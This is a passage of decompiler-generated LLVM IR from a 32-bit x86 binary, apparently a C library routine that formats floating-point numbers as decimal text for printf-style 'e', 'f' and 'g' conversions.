  br i1 %v4_80560c8, label %dec_label_pc_80560fd, label %dec_label_pc_80560cc

dec_label_pc_80560cc:                             ; preds = %dec_label_pc_80560b9
  store x86_fp80 %v4_80560c4, x86_fp80* %st1.global-to-local, align 4
  %v5_80560d6 = sub i32 %stack_var_-220.0, %v0_8056103
  br label %dec_label_pc_80560ff

dec_label_pc_80560dc:                             ; preds = %dec_label_pc_80560b2
  %v3_80560dc = mul i32 %v1_80560b4, 12
  store i32 %v3_80560dc, i32* %eax.global-to-local, align 4
  %v1_80560df = add i32 %v3_80560dc, ptrtoint (x86_fp80** @global_var_805edc0.1011 to i32)
  %v2_80560df = inttoptr i32 %v1_80560df to x86_fp80*
  %v3_80560df = load x86_fp80, x86_fp80* %v2_80560df, align 4
  %v4_80560e5 = fdiv x86_fp80 %v3_80560df, %v1_80560ed
  store x86_fp80 %v4_80560e5, x86_fp80* %st1.global-to-local, align 4
  %v4_80560e7 = fcmp ogt x86_fp80 %v3_80560df, %v1_80560ed
  br i1 %v4_80560e7, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_80560dc
  store x86_fp80 %v3_80560df, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_80560ed

bb183:                                            ; preds = %dec_label_pc_80560dc
  %v5_80560e7 = fcmp olt x86_fp80 %v3_80560df, %v1_80560ed
  br i1 %v5_80560e7, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_80560df, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_80560fd

bb184:                                            ; preds = %bb183
  %not.v6_80560e7 = fcmp une x86_fp80 %v3_80560df, %v1_80560ed
  store x86_fp80 %v3_80560df, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_80560e7, label %dec_label_pc_80560fd, label %dec_label_pc_80560ed

dec_label_pc_80560ed:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_80560df, x86_fp80* %st1.global-to-local, align 4
  %v5_80560f7 = add i32 %stack_var_-220.0, %v0_8056103
  br label %dec_label_pc_80560ff

dec_label_pc_80560fd:                             ; preds = %dec_label_pc_80560b9, %.thread51, %bb184
  %v1_80560fd = phi x86_fp80 [ %v1_80560ed, %.thread51 ], [ %v1_80560ed, %bb184 ], [ %v3_80560be, %dec_label_pc_80560b9 ]
  %v0_80560b280 = phi x86_fp80 [ %v3_80560df, %.thread51 ], [ %v3_80560df, %bb184 ], [ %v4_80560c4, %dec_label_pc_80560b9 ]
  store x86_fp80 %v1_80560fd, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80560ff

dec_label_pc_80560ff:                             ; preds = %dec_label_pc_80560ed, %dec_label_pc_80560cc, %dec_label_pc_80560fd
  %v2_80560b581 = phi x86_fp80 [ %v1_80560fd, %dec_label_pc_80560fd ], [ %v2_80560b5, %dec_label_pc_80560ed ], [ %v1_80560ed, %dec_label_pc_80560cc ]
  %v0_80560b279 = phi x86_fp80 [ %v0_80560b280, %dec_label_pc_80560fd ], [ %v3_80560df, %dec_label_pc_80560ed ], [ %v4_80560c4, %dec_label_pc_80560cc ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_80560fd ], [ %v5_80560f7, %dec_label_pc_80560ed ], [ %v5_80560d6, %dec_label_pc_80560cc ]
  %v1_80560ff = icmp eq i32 %v1_80560b4, 0
  br i1 %v1_80560ff, label %.thread60, label %dec_label_pc_8056103

dec_label_pc_8056103:                             ; preds = %dec_label_pc_80560ff
  %v2_8056103 = sdiv i32 %v0_8056103, 2
  store i32 %v2_8056103, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80560b2

.thread60:                                        ; preds = %dec_label_pc_80560ff
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8056127

dec_label_pc_8056127:                             ; preds = %dec_label_pc_805600a, %.thread60
  %v0_80561e1 = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_805600a ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_805600a ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_805612b = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8056002, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_805613e = and i32 %v2_805612b, -65536
  %v1_8056143 = udiv i16 %tmp146, 256
  %v2_8056143 = zext i16 %v1_8056143 to i32
  %v3_8056143 = or i32 %v2_8056143, 12
  %v10_8056143 = mul nuw nsw i32 %v3_8056143, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_805613e.masked = zext i16 %tmp194 to i32
  %v11_8056143 = or i32 %v10_8056143, %v4_805613e.masked
  %v12_8056143 = or i32 %v11_8056143, %v6_805613e
  store i32 %v12_8056143, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805614b

dec_label_pc_805614b:                             ; preds = %dec_label_pc_805619d.dec_label_pc_805614b_crit_edge, %dec_label_pc_8056127
  %v2_8056170 = phi x86_fp80 [ %storemerge, %dec_label_pc_8056127 ], [ %v2_8056170.pre, %dec_label_pc_805619d.dec_label_pc_805614b_crit_edge ]
  %v1_805614b = phi i3 [ %v1_8056002, %dec_label_pc_8056127 ], [ %v1_805614b.pre, %dec_label_pc_805619d.dec_label_pc_805614b_crit_edge ]
  %v3_8056172 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8056127 ], [ %v0_805614b.pre, %dec_label_pc_805619d.dec_label_pc_805614b_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_805612b, %dec_label_pc_8056127 ], [ %v4_805616b, %dec_label_pc_805619d.dec_label_pc_805614b_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_8056172 to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_8056165 = sitofp i32 %tmp195 to x86_fp80
  %v4_805616b = add i32 %stack_var_-212.0, 9
  %v4_8056170 = fsub x86_fp80 %v2_8056170, %v5_8056165
  store i3 %v1_805614b, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8056172 = fmul x86_fp80 %v3_8056172, %v4_8056170
  store x86_fp80 %v4_8056172, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8056174

dec_label_pc_8056174:                             ; preds = %dec_label_pc_8056174.dec_label_pc_8056174_crit_edge, %dec_label_pc_805614b
  %v0_8056188 = phi i32 [ %v0_8056188.pre, %dec_label_pc_8056174.dec_label_pc_8056174_crit_edge ], [ %tmp195, %dec_label_pc_805614b ]
  %v0_8056178 = phi i32 [ %v0_8056178.pre, %dec_label_pc_8056174.dec_label_pc_8056174_crit_edge ], [ 0, %dec_label_pc_805614b ]
  %v1_8056178 = add i32 %v0_8056178, 1
  store i32 %v1_8056178, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_8056182 = sub i32 %v4_805616b, %v1_8056178
  %div = udiv i32 %v0_8056188, 10
  %tmp185 = urem i32 %v0_8056188, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_805618e = and i32 %div, 536870656
  store i32 %v2_8056182, i32* %edx.global-to-local, align 4
  %v1_8056194 = trunc i32 %tmp185 to i8
  %v2_8056194 = or i8 %v1_8056194, 48
  %v12_8056194 = zext i8 %v2_8056194 to i32
  %v15_8056194 = or i32 %v12_8056194, %v3_805618e
  store i32 %v15_8056194, i32* %eax.global-to-local, align 4
  %v3_8056199 = inttoptr i32 %v2_8056182 to i8*
  store i8 %v2_8056194, i8* %v3_8056199, align 1
  %v7_805619b = icmp sgt i32 %v1_8056178, 8
  br i1 %v7_805619b, label %dec_label_pc_805619d, label %dec_label_pc_8056174.dec_label_pc_8056174_crit_edge

dec_label_pc_8056174.dec_label_pc_8056174_crit_edge: ; preds = %dec_label_pc_8056174
  %v0_8056178.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8056188.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8056174

dec_label_pc_805619d:                             ; preds = %dec_label_pc_8056174
  %v0_805619d = load i32, i32* @edi, align 4
  %v1_805619d = add i32 %v0_805619d, 1
  store i32 %v1_805619d, i32* @edi, align 4
  %v7_80561a1 = icmp sgt i32 %v1_805619d, 2
  br i1 %v7_80561a1, label %dec_label_pc_80561a3, label %dec_label_pc_805619d.dec_label_pc_805614b_crit_edge

dec_label_pc_805619d.dec_label_pc_805614b_crit_edge: ; preds = %dec_label_pc_805619d
  %v0_805614b.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_805614b.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8056170.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805614b

dec_label_pc_80561a3:                             ; preds = %dec_label_pc_805619d
  %v0_80561a3 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80561a3 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_80561a3, x86_fp80* %st0.global-to-local, align 4
  %v2_80561a5 = add i3 %v0_80561a3, 2
  store i3 %v2_80561a5, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80561a7 = add i8 %stack_var_-207.0, -96
  %v6_80561a7 = sub i8 95, %stack_var_-207.0
  %v7_80561a7 = and i8 %v6_80561a7, %stack_var_-207.0
  %v8_80561a7 = icmp slt i8 %v7_80561a7, 0
  %v9_80561a7 = icmp eq i8 %v4_80561a7, 0
  %v10_80561a7 = icmp slt i8 %v4_80561a7, 0
  %v3_80561ac = icmp eq i1 %v10_80561a7, %v8_80561a7
  %v4_80561ac = icmp eq i1 %v9_80561a7, false
  %v5_80561ac = and i1 %v4_80561ac, %v3_80561ac
  br i1 %v5_80561ac, label %dec_label_pc_80561bb, label %dec_label_pc_80561ae

dec_label_pc_80561ae:                             ; preds = %dec_label_pc_80561a3
  %v4_80561ae = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_80561bb

dec_label_pc_80561bb:                             ; preds = %dec_label_pc_80561a3, %dec_label_pc_80561ae
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_80561a3 ], [ %v4_80561ae, %dec_label_pc_80561ae ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_80561a3 ], [ 69, %dec_label_pc_80561ae ]
  %v12_80561bb = icmp eq i8 %stack_var_-207.1, 103
  %v1_80561c0 = icmp eq i1 %v12_80561bb, false
  br i1 %v1_80561c0, label %dec_label_pc_80561c9, label %dec_label_pc_80561c2

dec_label_pc_80561c2:                             ; preds = %dec_label_pc_80561bb
  %v0_80561c2 = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_80561c2, 1
  br i1 %tmp186, label %dec_label_pc_80561d0, label %dec_label_pc_80561c6

dec_label_pc_80561c6:                             ; preds = %dec_label_pc_80561c2
  %v1_80561c6 = add i32 %v0_80561c2, -1
  store i32 %v1_80561c6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80561d0

dec_label_pc_80561c9:                             ; preds = %dec_label_pc_80561bb
  %v12_80561c9 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_80561c9, label %dec_label_pc_80561d4, label %dec_label_pc_80561c9.dec_label_pc_80561d0_crit_edge

dec_label_pc_80561c9.dec_label_pc_80561d0_crit_edge: ; preds = %dec_label_pc_80561c9
  %v0_80561d0.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80561d0

dec_label_pc_80561d0:                             ; preds = %dec_label_pc_80561c9.dec_label_pc_80561d0_crit_edge, %dec_label_pc_80561c2, %dec_label_pc_80561c6
  %v0_80561d0 = phi i32 [ %v0_80561d0.pre, %dec_label_pc_80561c9.dec_label_pc_80561d0_crit_edge ], [ %v0_80561c2, %dec_label_pc_80561c2 ], [ %v1_80561c6, %dec_label_pc_80561c6 ]
  store i32 %v0_80561d0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056201

dec_label_pc_80561d4:                             ; preds = %dec_label_pc_80561c9
  store i32 %v0_80561e1, i32* %eax.global-to-local, align 4
  %v0_80561d8 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80561d8 = add i32 %v0_80561d8, %v0_80561e1
  store i32 %v2_80561d8, i32* %ebx.global-to-local, align 4
  %v5_80561df = icmp slt i32 %v2_80561d8, -1
  br i1 %v5_80561df, label %dec_label_pc_80561e1, label %dec_label_pc_8056201

dec_label_pc_80561e1:                             ; preds = %dec_label_pc_80561d4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80561e9 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_80561e9, i32* %eax.global-to-local, align 4
  %v4_80561f1 = bitcast i32* %stack_var_-72 to i8*
  %v5_80561f1 = call i32 @__GI_memset(i8* %v4_80561f1, i32 48, i32 21)
  store i32 %v5_80561f1, i32* %eax.global-to-local, align 4
  %v0_8056201.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056201

dec_label_pc_8056201:                             ; preds = %dec_label_pc_80561d4, %dec_label_pc_80561e1, %dec_label_pc_80561d0
  %v1_8056221 = phi i32 [ %v0_80561d0, %dec_label_pc_80561d0 ], [ %v2_80561d8, %dec_label_pc_80561d4 ], [ %v0_8056201.pr.pre, %dec_label_pc_80561e1 ]
  %stack_var_-220.3 = phi i32 [ %v0_80561e1, %dec_label_pc_80561d0 ], [ %v0_80561e1, %dec_label_pc_80561d4 ], [ -1, %dec_label_pc_80561e1 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8056214 = icmp sgt i32 %v1_8056221, 20
  br i1 %v7_8056214, label %dec_label_pc_8056216, label %dec_label_pc_8056221

dec_label_pc_8056216:                             ; preds = %dec_label_pc_8056201
  %v2_8056216 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8056216, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8056235.preheader

dec_label_pc_8056221:                             ; preds = %dec_label_pc_8056201
  %v0_8056221 = load i32, i32* @esp, align 4
  %v2_8056221 = add i32 %v1_8056221, 165
  %v3_8056221 = add i32 %v2_8056221, %v0_8056221
  store i32 %v3_8056221, i32* %eax.global-to-local, align 4
  %v1_8056228 = add i32 %v3_8056221, 2
  %v2_8056228 = inttoptr i32 %v1_8056228 to i8*
  %v3_8056228 = load i8, i8* %v2_8056228, align 1
  %v4_8056228 = add i8 %v3_8056228, -53
  %v9_8056228 = sub i8 52, %v3_8056228
  %v10_8056228 = and i8 %v9_8056228, %v3_8056228
  %v11_8056228 = icmp slt i8 %v10_8056228, 0
  %v13_8056228 = icmp slt i8 %v4_8056228, 0
  store i32 %v1_8056228, i32* %ecx.global-to-local, align 4
  %v2_805622f = icmp eq i1 %v13_8056228, %v11_8056228
  %v3_805622f = zext i1 %v2_805622f to i32
  br label %dec_label_pc_8056235.preheader

dec_label_pc_8056235.preheader:                   ; preds = %dec_label_pc_8056221, %dec_label_pc_8056216
  %v0_8056235102 = phi i32 [ %v1_8056228, %dec_label_pc_8056221 ], [ %v2_8056216, %dec_label_pc_8056216 ]
  %storemerge71 = phi i32 [ %v3_805622f, %dec_label_pc_8056221 ], [ 0, %dec_label_pc_8056216 ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056235

dec_label_pc_8056235:                             ; preds = %dec_label_pc_8056235.backedge, %dec_label_pc_8056235.preheader
  %v3_8056236 = phi i32 [ %v3_8056236.pre, %dec_label_pc_8056235.backedge ], [ %storemerge71, %dec_label_pc_8056235.preheader ]
  %v0_8056235 = phi i32 [ %v0_8056238, %dec_label_pc_8056235.backedge ], [ %v0_8056235102, %dec_label_pc_8056235.preheader ]
  %v1_8056235 = add i32 %v0_8056235, -1
  store i32 %v1_8056235, i32* %ecx.global-to-local, align 4
  %v1_8056236 = inttoptr i32 %v1_8056235 to i8*
  %v2_8056236 = load i8, i8* %v1_8056236, align 1
  %v4_8056236 = trunc i32 %v3_8056236 to i8
  %v5_8056236 = add i8 %v2_8056236, %v4_8056236
  store i8 %v5_8056236, i8* %v1_8056236, align 1
  %v0_8056238 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056238 = inttoptr i32 %v0_8056238 to i8*
  %v2_8056238 = load i8, i8* %v1_8056238, align 1
  %v3_8056238 = zext i8 %v2_8056238 to i32
  %v4_8056238 = load i32, i32* %edx.global-to-local, align 4
  %v5_8056238 = and i32 %v4_8056238, -256
  %v6_8056238 = or i32 %v5_8056238, %v3_8056238
  store i32 %v6_8056238, i32* %edx.global-to-local, align 4
  %v7_805623a = icmp eq i8 %v2_8056238, 48
  br i1 %v7_805623a, label %dec_label_pc_8056235.backedge, label %dec_label_pc_805623f

dec_label_pc_8056235.backedge:                    ; preds = %dec_label_pc_8056235, %dec_label_pc_805623f
  %v3_8056236.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056235

dec_label_pc_805623f:                             ; preds = %dec_label_pc_8056235
  %v2_805623f = add i8 %v2_8056238, -57
  %v7_805623f = sub i8 56, %v2_8056238
  %v8_805623f = and i8 %v7_805623f, %v2_8056238
  %v9_805623f = icmp slt i8 %v8_805623f, 0
  %v10_805623f = icmp eq i8 %v2_805623f, 0
  %v11_805623f = icmp slt i8 %v2_805623f, 0
  %v3_8056242 = icmp eq i1 %v11_805623f, %v9_805623f
  %v4_8056242 = icmp eq i1 %v10_805623f, false
  %v5_8056242 = and i1 %v4_8056242, %v3_8056242
  br i1 %v5_8056242, label %dec_label_pc_8056235.backedge, label %dec_label_pc_8056244

dec_label_pc_8056244:                             ; preds = %dec_label_pc_805623f
  %v2_8056244 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8056244, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_8056238, %v2_8056244
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_805624f, label %dec_label_pc_805625c

dec_label_pc_805624f:                             ; preds = %dec_label_pc_8056244
  store i32 %v2_805612b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056265

dec_label_pc_805625c:                             ; preds = %dec_label_pc_8056244
  store i32 %v2_8056244, i32* %edx.global-to-local, align 4
  store i32 %v2_8056244, i32* %ecx.global-to-local, align 4
  %v1_8056264 = add i32 %stack_var_-220.3, 1
  store i32 %v1_8056264, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8056265

dec_label_pc_8056265:                             ; preds = %dec_label_pc_805624f, %dec_label_pc_805625c
  %v0_8056265 = phi i32 [ %v0_8056238, %dec_label_pc_805624f ], [ %v2_8056244, %dec_label_pc_805625c ]
  %v1_8056265 = add i32 %v0_8056265, 1
  store i32 %v1_8056265, i32* %eax.global-to-local, align 4
  %v2_805626c = inttoptr i32 %v1_8056265 to i8*
  store i8 0, i8* %v2_805626c, align 1
  br i1 %v1_80561c0, label %dec_label_pc_8056292, label %dec_label_pc_8056277

dec_label_pc_8056277:                             ; preds = %dec_label_pc_8056265
  %v0_8056277 = load i32, i32* %esi.global-to-local, align 4
  %v5_805627a = icmp slt i32 %v0_8056277, -4
  br i1 %v5_805627a, label %dec_label_pc_805629f, label %dec_label_pc_805627c

dec_label_pc_805627c:                             ; preds = %dec_label_pc_8056277
  %v1_805627c = load i32, i32* %ebx.global-to-local, align 4
  %v7_805627e = icmp slt i32 %v1_805627c, %v0_8056277
  br i1 %v7_805627e, label %dec_label_pc_805629f, label %dec_label_pc_8056287

dec_label_pc_8056287:                             ; preds = %dec_label_pc_805627c
  %v2_8056289 = sub i32 %v1_805627c, %v0_8056277
  store i32 %v2_8056289, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80562a3

dec_label_pc_8056292:                             ; preds = %dec_label_pc_8056265
  %v4_8056292 = zext i8 %stack_var_-207.1 to i32
  %v5_8056292 = load i32, i32* %ebx.global-to-local, align 4
  %v6_8056292 = and i32 %v5_8056292, -256
  %v7_8056292 = or i32 %v6_8056292, %v4_8056292
  store i32 %v7_8056292, i32* %ebx.global-to-local, align 4
  %v10_8056296 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_8056296, label %dec_label_pc_8056292.dec_label_pc_80562a3_crit_edge, label %dec_label_pc_805629f

dec_label_pc_8056292.dec_label_pc_80562a3_crit_edge: ; preds = %dec_label_pc_8056292
  %v0_80562a3.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80562a3

dec_label_pc_805629f:                             ; preds = %dec_label_pc_8056277, %dec_label_pc_805627c, %dec_label_pc_8056292
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8056292 ], [ 103, %dec_label_pc_805627c ], [ 103, %dec_label_pc_8056277 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80562ad

dec_label_pc_80562a3:                             ; preds = %dec_label_pc_8056292.dec_label_pc_80562a3_crit_edge, %dec_label_pc_8056287
  %v0_80562a5 = phi i32 [ %v0_80562a3.pre, %dec_label_pc_8056292.dec_label_pc_80562a3_crit_edge ], [ %v0_8056277, %dec_label_pc_8056287 ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8056292.dec_label_pc_80562a3_crit_edge ], [ 102, %dec_label_pc_8056287 ]
  %v2_80562a3 = icmp slt i32 %v0_80562a5, 0
  store i32 %v0_80562a5, i32* %ebx.global-to-local, align 4
  %v1_80562a7 = icmp eq i1 %v2_80562a3, false
  br i1 %v1_80562a7, label %dec_label_pc_80562ad, label %dec_label_pc_80562a9

dec_label_pc_80562a9:                             ; preds = %dec_label_pc_80562a3
  %v0_80562a9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80562a9 = add i32 %v0_80562a9, -1
  store i32 %v1_80562a9, i32* %edx.global-to-local, align 4
  %v1_80562aa = inttoptr i32 %v1_80562a9 to i8*
  store i8 48, i8* %v1_80562aa, align 1
  %v0_80562e2.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80562ad

dec_label_pc_80562ad:                             ; preds = %dec_label_pc_80562a3, %dec_label_pc_805629f, %dec_label_pc_80562a9
  %v1_805633d = phi i32 [ %v0_80562a5, %dec_label_pc_80562a3 ], [ %v0_80562e2.pre, %dec_label_pc_80562a9 ], [ 0, %dec_label_pc_805629f ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_80562a3 ], [ %stack_var_-197.1, %dec_label_pc_80562a9 ], [ %stack_var_-197.0, %dec_label_pc_805629f ]
  %v2_80562ad = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_80562ad, i32* %eax.global-to-local, align 4
  %v0_80562bc = load i32, i32* %edx.global-to-local, align 4
  %v1_80562bc = add i32 %v0_80562bc, 1
  store i32 %v1_80562bc, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_80562cb = inttoptr i32 %v0_80562bc to i8*
  %v2_80562cb = load i8, i8* %v1_80562cb, align 1
  %v3_80562cb = zext i8 %v2_80562cb to i32
  %v5_80562cb = and i32 %v2_80562ad, -256
  %v6_80562cb = or i32 %v3_80562cb, %v5_80562cb
  store i32 %v6_80562cb, i32* %eax.global-to-local, align 4
  store i32 %v6_80562cb, i32* %stack_var_-22, align 4
  %v2_80562e0 = sub i32 %v1_8056265, %v1_80562bc
  store i32 %v2_80562e0, i32* %edx.global-to-local, align 4
  %v1_80562e2 = icmp eq i32 %v1_805633d, 0
  %v2_80562e2 = icmp slt i32 %v1_805633d, 0
  br i1 %v2_80562e2, label %dec_label_pc_8056331, label %dec_label_pc_80562e6

dec_label_pc_80562e6:                             ; preds = %dec_label_pc_80562ad
  %v2_80562e6 = sub i32 %v1_805633d, %v2_80562e0
  %v8_80562e6 = xor i32 %v2_80562e0, %v1_805633d
  %v9_80562e6 = xor i32 %v2_80562e6, %v1_805633d
  %v10_80562e6 = and i32 %v9_80562e6, %v8_80562e6
  %v11_80562e6 = icmp slt i32 %v10_80562e6, 0
  %v13_80562e6 = icmp slt i32 %v2_80562e6, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_80562f4 = icmp eq i1 %v13_80562e6, %v11_80562e6
  br i1 %v2_80562f4, label %dec_label_pc_80562f6, label %dec_label_pc_805632a

dec_label_pc_80562f6:                             ; preds = %dec_label_pc_80562e6
  store i32 %v2_80562e6, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_80562e6, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_805630b, label %dec_label_pc_8056326

dec_label_pc_805630b:                             ; preds = %dec_label_pc_80562f6
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8056326

dec_label_pc_8056326:                             ; preds = %dec_label_pc_80562f6, %dec_label_pc_805630b
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_805630b ], [ %stack_var_-132, %dec_label_pc_80562f6 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056346

dec_label_pc_805632a:                             ; preds = %dec_label_pc_80562e6
  %v4_805632c = icmp eq i1 %v1_80562e2, false
  br i1 %v4_805632c, label %dec_label_pc_8056337, label %dec_label_pc_805632e

dec_label_pc_805632e:                             ; preds = %dec_label_pc_805632a
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056331

dec_label_pc_8056331:                             ; preds = %dec_label_pc_80562ad, %dec_label_pc_805632e
  %v0_8056379112 = phi i32 [ %v1_805633d, %dec_label_pc_80562ad ], [ -1, %dec_label_pc_805632e ]
  %v2_8056331 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8056331, i32* @ecx, align 4
  br label %dec_label_pc_8056346

dec_label_pc_8056337:                             ; preds = %dec_label_pc_805632a
  %v2_805633b = add i32 %v1_80562bc, %v1_805633d
  store i32 %v2_805633b, i32* %edi.global-to-local, align 4
  %v2_805633d = sub i32 %v2_80562e0, %v1_805633d
  store i32 %v2_805633d, i32* %edx.global-to-local, align 4
  %v2_805633f = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805633f, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056346

dec_label_pc_8056346:                             ; preds = %dec_label_pc_8056331, %dec_label_pc_8056326, %dec_label_pc_8056337
  %v0_8056379111 = phi i32 [ %v0_8056379112, %dec_label_pc_8056331 ], [ -1, %dec_label_pc_8056326 ], [ -1, %dec_label_pc_8056337 ]
  %v0_8056362 = phi i32 [ %v2_8056331, %dec_label_pc_8056331 ], [ %storemerge28, %dec_label_pc_8056326 ], [ %v2_805633f, %dec_label_pc_8056337 ]
  %v0_8056353 = phi i32 [ %v2_80562e0, %dec_label_pc_8056331 ], [ 0, %dec_label_pc_8056326 ], [ %v2_805633d, %dec_label_pc_8056337 ]
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  %v2_805634d = inttoptr i32 %v1_8055fc3 to i8*
  %v3_805634d = load i8, i8* %v2_805634d, align 1
  %v4_805634d = and i8 %v3_805634d, 16
  %v5_805634d = icmp eq i8 %v4_805634d, 0
  %v1_8056351 = icmp eq i1 %v5_805634d, false
  br i1 %v1_8056351, label %dec_label_pc_8056362, label %dec_label_pc_8056353

dec_label_pc_8056353:                             ; preds = %dec_label_pc_8056346
  %v1_8056353 = icmp eq i32 %v0_8056353, 0
  %v1_8056355 = icmp eq i1 %v1_8056353, false
  br i1 %v1_8056355, label %dec_label_pc_8056362, label %dec_label_pc_8056357

dec_label_pc_8056357:                             ; preds = %dec_label_pc_8056353
  br i1 %v12_80561bb, label %dec_label_pc_8056379, label %dec_label_pc_805635e

dec_label_pc_805635e:                             ; preds = %dec_label_pc_8056357
  %v0_805635e = load i32, i32* %ebp.global-to-local, align 4
  %tmp189 = icmp slt i32 %v0_805635e, 1
  br i1 %tmp189, label %dec_label_pc_8056379, label %dec_label_pc_8056362

dec_label_pc_8056362:                             ; preds = %dec_label_pc_805635e, %dec_label_pc_8056353, %dec_label_pc_8056346
  %v1_8056362 = inttoptr i32 %v0_8056362 to i32*
  store i32 112, i32* %v1_8056362, align 4
  %v0_8056368 = load i32, i32* @ecx, align 4
  %v1_8056368 = add i32 %v0_8056368, 4
  %v2_8056368 = inttoptr i32 %v1_8056368 to i32*
  store i32 1, i32* %v2_8056368, align 4
  %v0_805636f = load i32, i32* @ecx, align 4
  %v1_805636f = add i32 %v0_805636f, 8
  %v2_805636f = inttoptr i32 %v1_805636f to i32*
  store i32 ptrtoint (i32* @global_var_805eda0.1014 to i32), i32* %v2_805636f, align 4
  %v0_8056376 = load i32, i32* @ecx, align 4
  %v1_8056376 = add i32 %v0_8056376, 12
  store i32 %v1_8056376, i32* @ecx, align 4
  %v0_8056379.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056379

dec_label_pc_8056379:                             ; preds = %dec_label_pc_805635e, %dec_label_pc_8056357, %dec_label_pc_8056362
